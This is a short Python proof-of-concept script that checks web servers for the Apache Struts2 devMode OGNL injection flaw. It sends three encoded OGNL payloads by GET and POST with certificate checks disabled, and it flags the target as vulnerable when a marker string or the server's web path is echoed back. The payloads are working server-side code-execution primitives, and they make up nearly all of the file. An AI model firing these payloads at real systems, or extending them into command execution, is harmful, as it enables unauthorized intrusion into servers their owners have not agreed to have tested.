import warnings
import requests

warnings.filterwarnings("ignore")


def poc(url):
    timeout = 10
    proxies = {'http': '127.0.0.1:9999'}
    check = ['\Struts2-vuln-Goop', '/Struts2-vuln-Goop', '-Struts2-vuln-Goop']
    poc_goop = [
        r"debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=Struts2-vuln-Goop&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest",
        r"debug=browser&object=%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2c%23res%3d@org.apache.struts2.ServletActionContext@getResponse%28%29%2c%23w%3d%23res.getWriter%28%29%2c%23w.print%28%27-Struts2-vuln%27%2b%27-Goop%27%29%29",
        r"debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path))&pp=Struts2-vuln-Goop"
    ]
    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        for test in poc_goop:
            req_get = requests.get(url + '?' + test, headers=headers, timeout=timeout, verify=False, )
            req_post = requests.post(url, data=test, headers=headers, timeout=timeout, verify=False, )
            req_list = [req_get.text, req_post.text]
            result = "目标存在 Struts2-dev, check url: %s" % url
            for c in check:
                for text in req_list:
                    if str(c) in text:
                        return result
    except:
        pass

# test_url =
